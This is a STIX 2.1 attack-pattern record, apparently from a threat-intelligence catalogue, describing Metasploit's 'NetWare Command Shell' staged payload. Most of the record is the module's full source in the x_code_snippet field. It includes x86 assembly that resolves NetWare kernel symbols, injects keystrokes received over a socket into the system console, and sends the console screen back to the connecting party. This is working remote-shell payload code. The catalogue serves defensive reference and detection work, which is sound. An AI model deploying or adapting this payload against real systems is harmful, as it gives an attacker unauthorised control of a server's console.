{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59df6be7-43ff-4562-963d-01b2c3bb6f8c",
    "created": "2024-08-14T16:33:19.246164Z",
    "modified": "2024-08-14T16:33:19.246168Z",
    "name": "NetWare Command Shell",
    "description": "Connect to the NetWare console (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/netware/shell.rb",
            "external_id": "shell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nmodule MetasploitModule\n\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'NetWare Command Shell',\n      'Description'   => 'Connect to the NetWare console (staged)',\n      'Author'        => 'toto',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'netware',\n      'Arch'          => ARCH_X86,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadCompat' =>\n        {\n          'Convention' => 'sockesi'\n        },\n      'Stage'         =>\n        {\n          'Offsets' =>\n            {\n              #'EXITFUNC' => [ 443, 'V' ]\n            },\n          'Assembly' => <<EOS\njmp main_code\n;;;\n; resolve a symbol address using the DebuggerSymbolHashTable\n; (could resolve only against function name for smaller code)\n;;;\n\nresolv_addr:\n  push edi\n  push ecx\n  xor edi, edi\nr_loop:\n  mov edx, [ebp+edi*4]\n  test edx, edx\n  jz  r_next\nr_loop2:\n  xor esi, esi\n  mov ebx, [edx+8]\n  mov al, byte ptr[ebx]\nr_iloop2:\n  test al, al\n  jz r_after2\n  inc ebx\n  movzx ecx, byte ptr[ebx]\n  ror esi, 0x0d\n  add esi, ecx\n  dec al\n  jmp r_iloop2\nr_after2:\n  cmp esi, [esp+0x0c]\n  jz r_found\n  mov edx, [edx]\n  test edx, edx\n  jnz r_loop2\nr_next:\n  inc edi\n  cmp edi, 0x200\n  jnz r_loop\n  jmp r_end\nr_found:\n  mov eax, [edx+4]\nr_end:\n  pop ecx\n  pop edi\n  ret\n\n\nmain_code:\n  ; save socket identifier\n  call main_next\nmain_next:\n  pop edi\n  add edi, (socket_ptr - main_next)\n  mov eax, esi\n  stosd\n\n  ; search DebuggerSymbolHashTable pointer using GDT system call gate\n  ; -> points inside SERVER.NLM\n  cli\n  sub esp, 8\n  mov ecx, esp\n  sgdt [ecx]\n\n  cli\n  mov ebx, [ecx+2]\n  mov bp, word ptr [ebx+0x4E]\n  shl ebp, 16\n  mov bp, word ptr [ebx+0x48]\n\nf_finddebugger:\n  cmp dword ptr[ebp], 0\n  jnz f_next\n  cmp dword ptr[ebp+4], 0x808bc201\n  jz f_end\nf_next:\n  dec ebp\n  jmp f_finddebugger\nf_end:\n  mov ebp, [ebp-7]\n\n  ; resolve function pointers\n  mov cl, 15\nresolv_ptrs:\n  push [edi]\n  call resolv_addr\n  stosd\n  dec cl\n  test cl, cl\n  jnz resolv_ptrs\n\n  sti\n\n  ; all screens have the same size\n  push edi\n  lea esi, [edi+4]\n  push esi\n  call [edi-0x18]        ; SERVER.NLM|GetScreenSize\n\n  ; allocate 2 buffer for the main screen and the backup\n  xor eax, eax\n  xor ebx, ebx\n  mov ax, word ptr[edi]\n  mov bx, word ptr[esi]\n  imul eax, ebx\n  mov [edi+8], eax\n\n  push eax\n  call [edi-8]          ; AFPTCP.NLM|LB_malloc\n  mov [edi+0xc], eax\n\n  call [edi-0x14]       ; SERVER.NLM|GetSystemConsoleScreen\n  mov [edi+0x10], eax\n\n  sub esp, 4\n  mov ebp, esp          ; n\n\nrecv_loop:\n  xor ebx, ebx\n  inc ebx\n\n  push 200000           ; tv_usec\n  push 0                ; tv_sec (0)\n  mov edx, esp          ; timeout\n\n  sub esp, 4\n  mov ecx, esp          ; rescode\n\n  push 1                ; num socket (1)\n  push ecx              ; &rescode\n  push edx              ; &timeout\n  push 0                ; NULL\n  push 0                ; NULL\n  push 0                ; NULL\n  push [edi-0x40]       ; socket\n  call [edi-0x2C]       ; LIBC.NLM|bsd_select_mp\n  add esp, 0x28\n  test eax, eax\n  jnz end\n\n  call update_screen\n\n  sub esp, 4\n  mov edx, esp\n  push edx              ; &rescode\n  push ebp              ; &n\n  push ebx              ; FIONREAD\n  push [edi-0x40]       ; socket\n  call [edi-0x38]       ; LIBC.NLM|_ioctlsocket\n  add esp, 0x14\n  test eax, eax\n  jnz end\n  cmp [ebp], 0\n  jz recv_loop\n  ; check we are not longer than the key buffer size\n  cmp [ebp], 32\n  jbe recvd\n  mov [ebp], 32\nrecvd:\n  lea eax, [edi+0x20]\n  push [ebp]\n  push eax\n  call recv_data\n  add esp, 8\n\n  mov ebx, [ebp]\n  lea esi, [edi+0x20]\n  mov byte ptr[esi+ebx], 0\n\n  ;push 0x00FFFEFF\n  ;mov eax, esp\n  ;push eax\n  ;push [edi+0x10]         ; screen\n  ;call [edi-0x3C]         ; SERVER.NLM|DirectOutputToScreen\n  ;add esp, 0x0c\n\nsend_input:\n  movzx eax, byte ptr[esi]\n  test eax, eax\n  jz send_end\n\n  cmp al, 0x0a\n  jz send_enter\n\n  ; we need to inject the command in the console input\n  push 0x00\n  push 0x00               ; should be the keycode in fact\n  push eax                ; key value\n  push 0x0\n  push [edi+0x10]         ; screen\n  call [edi-0x20]         ; SERVER.NLM|AddKey\n  jmp send_next\n\nsend_enter:\n  ; send special code for enter\n  push 0x1c\n  push 0x00\n  push 0x00\n  push 0x02\n  push [edi+0x10]         ; screen\n  call [edi-0x20]         ; SERVER.NLM|AddKey\n\n  push 0x00FFFEFF\n  mov eax, esp\n  push eax\n  push [edi+0x10]         ; screen\n  call [edi-0x3C]         ; SERVER.NLM|DirectOutputToScreen\n  add esp, 0x0c\nsend_next:\n\n  add esp, 0x14\n  inc esi\n  jmp send_input\nsend_end:\n\n  jmp recv_loop\n\nend:\n  sub esp, 4\n  mov ebp, esp          ; rescode\n\n  push ebp              ; rescode\n  push 2                ; SHUT_RDWR\n  push [edi-0x40]       ; socket\n  call [edi-0x30]       ; LIBC.NLM|bsd_shutdown_mp\n\n  push ebp              ; rescode\n  push [edi-0x40]       ; socket\n  call [edi-0x34]       ; LIBC.NLM|bsd_close_mp\n\n  ; go back to the main kernel loop\n  call [edi-0x0C]       ; SERVER.NLM|kWorkerThread\n\n\nupdate_screen:\n  pushad\n\n  push [edi+0x0c]\n  push 0\n  push [edi+0x08]\n  push 0\n  push [edi+0x10]\n  call [edi-0x1C]       ; SERVER.NLM|ReadScreenIntoBuffer\n  add esp, 0x14\n\n  mov edx, [edi+0x0c]\n  xor ebx, ebx\n  xor esi, esi\n  xor ebp, ebp\nchecksum:\n  cmp ebx, [edi+4]\n  jz end_checksum\n  xor ecx, ecx\ncheck_line:\n  cmp ecx, [edi]\n  jz next_line\n  mov al, byte ptr[edx]\n  ror esi, 0x0d\n  add esi, eax\n  cmp [edx], 0x20FFFEFF\n  jnz check_line2\n  mov ebp, ebx\n  inc ebp\ncheck_line2:\n  inc edx\n  inc ecx\n  jmp check_line\nnext_line:\n  inc ebx\n  jmp checksum\nend_checksum:\n\n  cmp esi, [edi+0x14]\n  jnz new_checksum\n  cmp [edi+0x18], 1\n  jz end_update\n  mov [edi+0x18], 1\n  push ebp\n  call send_screen\n  add esp, 4\n  jmp end_update\n\nnew_checksum:\n  mov [edi+0x14], esi\n  mov [edi+0x18], 0\nend_update:\n  popad\n  ret\n\n\nsend_screen:\n  push ebx\n\n  sub esp, 4\n  mov esi, esp\n\n  push esi\n  lea eax, [esi+2]\n  push eax\n  push [edi+0x10]\n  call [edi-0x10]       ; SERVER.NLM|GetInputCursorPosition\n  add esp, 0x0c\n\n  mov ebx, [esp+0x0c]\n  xor edx, edx\n  mov ecx, [edi+0x0c]\n  mov eax, dword ptr[edi]\n  imul eax, ebx\n  add ecx, eax\n\nsend_loop:\n  cmp bx, word ptr[esi+2]\n  jae last_line\n  mov dx, word ptr[edi]\n  jmp next_send\nlast_line:\n  mov dx, word ptr[esi]\nnext_send:\n\n  push edx\n  push ecx\n  call send_data\n  add esp, 0x08\n\n  cmp bx, word ptr[esi+2]\n  jae end_sl\n\n  push 0x0000000a\n  mov eax, esp\n  push 1\n  push eax\n  call send_data\n  add esp, 0x0C\n\n  inc ebx\n  add ecx, edx\n  cmp bx, word ptr[esi+2]\n  jbe send_loop\nend_sl:\n  pop ebx\n  pop ebx\n  ret\n\n\nsend_data:\n  push [esp+8]\n  push [esp+8]\n  push [edi-0x40]\n  push [edi-0x24]\n  call sendrecv_data\n  add esp, 0x10\n  ret\n\nrecv_data:\n  push [esp+8]\n  push [esp+8]\n  push [edi-0x40]\n  push [edi-0x28]\n  call sendrecv_data\n  add esp, 0x10\n  ret\n\n\nsendrecv_data:\n  push ebp\n  push ecx\n  push ebx\n  push edx\n  mov ebp, esp\n\n  push [ebp+0x20]         ; iov_len\n  push [ebp+0x1C]         ; iov_base\n  mov ecx, esp            ; msg_iov\n\n  xor ebx, ebx            ; struct msghdr\n  push ebx                ; msg_flags\n  push ebx                ; msg_controllen\n  push ebx                ; msg_control\n  inc ebx\n  push ebx                ; msg_iovlen (1 array)\n  dec ebx\n  push ecx                ; msg_iov\n  push ebx                ; msg_namelen\n  push ebx                ; msg_name\n\n  mov ecx, esp            ; message\n\n  sub esp, 4\n  mov edx, esp            ; rescode\n\n  push edx                ; rescode\n  push 0                  ; flags\n  push ecx                ; message\n  push [ebp+0x18]         ; socket\n  call [ebp+0x14]         ; SERVER.NLM|bsd_recvmsg_mp\n\n  mov esp, ebp\n  pop edx\n  pop ebx\n  pop ecx\n  pop ebp\n  ret\n\n\n\n\nsocket_ptr:\n  dd 0\nfct_ptrs:\n  dd 0xadc21dfc         ; SERVER.NLM|DirectUnformattedOutputToScreen\n  dd 0xb08c8051         ; LIBC.NLM|_ioctlsocket\n  dd 0x4907702d         ; LIBC.NLM|bsd_close_mp\n  dd 0x312cc527         ; LIBC.NLM|bsd_shutdown_mp\n  dd 0x46c65ccd         ; LIBC.NLM|bsd_select_mp\n  dd 0x3605cc1c         ; LIBC.NLM|bsd_recvmsg_mp\n  dd 0x35bdd27c         ; LIBC.NLM|bsd_sendmsg_mp\n  dd 0xe98bfec3         ; SERVER.NLM|AddKey\n  dd 0x6ea378a4         ; SERVER.NLM|ReadScreenIntoBuffer\n  dd 0x898d560c         ; SERVER.NLM|GetScreenSize\n  dd 0x03cfcbe3         ; SERVER.NLM|GetSystemConsoleScreen\n  dd 0xfe52051f         ; SERVER.NLM|GetInputCursorPosition\n  dd 0x9294bdcb         ; SERVER.NLM|kWorkerThread\n  dd 0x6877687c         ; AFPTCP.NLM|LB_malloc\n  dd 0xaf50f9e7         ; AFPTCP.NLM|LB_free\nscreen_info:\n  dd 0\n  dd 0\n  dd 0\n  dd 0\n  dd 0\n  dd 0            ; screen checksum\n  dd 0            ; screen state\nend_reverse:\n  nop\nEOS\n        }\n      ))\n  end\n\n  def size\n    279\n  end\nend\n",
    "x_mitre_platforms": [
        "netware'"
    ]
}